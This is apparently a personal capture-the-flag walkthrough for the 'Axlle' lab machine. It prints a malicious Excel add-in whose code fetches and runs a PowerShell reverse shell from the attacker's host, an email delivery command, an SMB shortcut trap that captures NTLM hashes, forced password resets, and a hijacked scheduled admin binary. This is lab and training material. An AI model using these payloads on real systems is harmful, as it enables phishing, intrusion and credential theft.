**Nmap Scans**
```
mapit 10.10.11.21 --speed
```
Initiated All Scans

**Nmap Default Scan**
![[Pasted image 20240624211103.png]]

**Nmap Script and Service Scan**
![[Pasted image 20240624211216.png]]
![[Pasted image 20240624211302.png]]

Nmap All Port Scan
![[Pasted image 20240624212709.png]]
![[Pasted image 20240624212738.png]]

Nmap Service and Script Scan for newly Identified Ports
![[Pasted image 20240624212836.png]]

On Port 80
![[Pasted image 20240625105234.png]]

All macros are disabled, we have to send email with 
![[Pasted image 20240625110854.png]]

Gobuster
```
gobuster dir -u http://10.10.11.21 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240625132442.png]]

ffuf 
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.21/FUZZ -t 100 -o ffuf.txt
```
![[Pasted image 20240625132550.png]]
Nothing Intresting


**Generating Malicious .xll file**
It's gonna be tedious process, Will generate a .xll file using this github repo: https://github.com/Octoberfest7/XLL_Phishing

First Clone will clone the repo in our kali
```
git clone https://github.com/Octoberfest7/XLL_Phishing.git 
```
![[Pasted image 20240625125557.png]]

We have to get the **2013_Office_System_Developer_Resources** to compile the program and generate the .xll file

Download link for **2013_Office_System_Developer_Resources**: https://www.microsoft.com/en-us/download/details.aspx?id=35567
![[Pasted image 20240625125851.png]]

Download this in .msi file my windows machine and transfer the file to kali
![[Pasted image 20240625125954.png]]

Transferred to kali 
![[Pasted image 20240625130016.png]]

Now ill execute the commands
```
cd XLL_Phishing
ls
```
![[Pasted image 20240625130158.png]]

compile the ingestfile.c file 
```
gcc -o ingestfile ingestfile.c
```
![[Pasted image 20240625130311.png]]

Now have to change the code in snippet.c according to get a reverse shell
Modified snippet.c
```
#include <windows.h>
#include <stdlib.h>

__declspec(dllexport) int WINAPI xlAutoOpen(void)
{
    // Your existing code...

    // Add the reverse shell download code
    system("powershell -ep bypass -w hidden -Command iex(New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1')");

    return 1;  // Return 1 on success
}
```

Now will run the main command which generate the .xll file accordingly
```
x86_64-w64-mingw32-gcc snippet.c 2013_Office_System_Developer_Resources/Excel2013XLLSDK/LIB/x64/XLCALL32.LIB -o pwned.xll -s -Os -DUNICODE -shared -I 2013_Office_System_Developer_Resources/Excel2013XLLSDK/INCLUDE/
```
![[Pasted image 20240625130541.png]]
We got our .xll file

Now will email this to accounts@axlle.htb using swaks
```
 swaks --to accounts@axlle.htb --from test@test.com --header "Subject: test" --body "test" --attach @pwned.xll --server 10.10.11.21 --port 25
```
![[Pasted image 20240625130720.png]]

Before running this have started the webserver on port 80, to deliver the rev.ps1 and started Netcat listener on port 443
![[Pasted image 20240625130831.png]]

Got Reverse shell
![[Pasted image 20240625130855.png]]

So we got a shell as user gideon.hamill

We don't have any interesting privileges, will explore more
```
whoami /priv
```
![[Pasted image 20240625131523.png]]

After a long enumeration, i have can some Intresting mail from hMailServer/data
![[Pasted image 20240625150638.png]]

![[Pasted image 20240625150704.png]]

![[Pasted image 20240625150723.png]]
there is an Email, will transfer that to our kali using smb share

Smb share
```
impacket-smbserver test . -smb2support  -username root -password R0ot
```
![[Pasted image 20240625150853.png]]

![[Pasted image 20240625150814.png]]

Now we can read the content of the email
![[Pasted image 20240625151041.png]]

So now we have to make a shortcut which should get us a reverse shell
navigate to inetpub/testing dir
![[Pasted image 20240625151212.png]]

Now will make a shortcut
```
$url = "file://///10.10.14.10/kali/met.exe"
$shortcutPath = "C:\inetpub\testing\pwn1.url"
$shortcutContent = "[InternetShortcut]`r`nURL=$url"
Set-Content -Path $shortcutPath -Value $shortcutContent
```
![[Pasted image 20240625151234.png]]

We can see our shortcut here
![[Pasted image 20240625151315.png]]

Before creating our shortcut, first wee need to remove password auth in or smb share
So, i have started a new share without auth
```
impacket-smbserver kali . -smb2support
```
![[Pasted image 20240625151413.png]]

Now Will wait to dev team member top click the shortcut
![[Pasted image 20240625151514.png]]
got NTLMv2 hash of a user dallon.matrix

And we got our reverse shell
![[Pasted image 20240625151619.png]]
Nice...:)

Got our user.txt, while searching for any intresting file in user directory
```
Get-ChildItem -Path C:\Users -Include *.txt, *.log, *.kdbx, *.conf, *.ini, *.exe -File -Recurse -ErrorAction SilentlyContinue
```
![[Pasted image 20240625151722.png]]

**User.txt**
![[Pasted image 20240625151850.png]]


Will Jump to lateral movement.....!




Will analyse the bloodhound data
![[Pasted image 20240625162126.png]]
Can see members of group web_dav can change password to user BAZ.HUMPHRIES and JACOB.GREENY

Now we a shell as dallon.matrix and he is member of web_dav
![[Pasted image 20240625154107.png]]

So we can change the password for user BAZ.HUMPHRIES
First imported Power view
![[Pasted image 20240625154650.png]]

And changed the password
![[Pasted image 20240625154635.png]]
![[Pasted image 20240625154708.png]]

changed password for Jacob in a same way but his password is **pwned@2000**
Now will check we can access Jacob
![[Pasted image 20240625162300.png]]
Yes we can...!

Will go to App development
![[Pasted image 20240625162337.png]]
Can see, admin is automated a program to run, will change that to our malicious.exe



Downloaded the met.exe which is our reverse shell binary and saved as the standalonerunner.exe
```
wget 10.10.14.10/met.exe -o standalonerunner.exe
```
![[Pasted image 20240625162441.png]]

Now will wait for our reverse shell ad admin
![[Pasted image 20240625162605.png]]
Got it...!

Will get the root Flag
![[Pasted image 20240625162712.png]]




Done With Axlle.......:)